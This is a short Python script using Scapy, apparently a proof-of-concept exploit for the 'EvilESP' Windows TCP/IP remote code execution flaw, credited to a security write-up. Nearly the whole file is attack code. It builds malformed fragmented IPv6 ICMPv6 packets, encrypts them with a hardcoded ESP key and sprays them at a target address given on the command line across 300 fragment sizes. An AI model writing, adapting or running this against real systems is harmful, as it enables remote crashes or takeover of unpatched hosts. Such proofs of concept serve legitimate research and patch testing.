# Built based on Chompie's post here
# https://securityintelligence.com/x-force/dissecting-exploiting-tcp-ip-rce-vulnerability-evilesp/

import sys
from scapy.all import *

sa = SecurityAssociation(ESP, spi=938628236, crypt_algo='AES-CBC',
                         crypt_key=b'superdupersecret')


def exploit(addr,sa,frag_size):

	print("frag size %x" % frag)
	IP = IPv6(src='fe80::7882:bba0:8b87:f045', dst=addr)

	data_size = max(frag_size*2, 0x200)

	LOL = ICMPv6EchoRequest(data="A"*data_size)


	FH = IPv6ExtHdrFragment()

	packets= fragment6(IP/FH/LOL/FH/LOL/FH/LOL,frag_size)

	for p in packets:
			p[IPv6ExtHdrFragment].nh = 0x41
			lol1 = sa.encrypt(p)
			sendp(Ether(dst='00:0c:29:a0:96:68')/lol1,verbose = 0)

frag = 0x38

addr = sys.argv[1]

for x in range(0,300):
	exploit(addr,sa,frag)
	frag = frag + 0x10
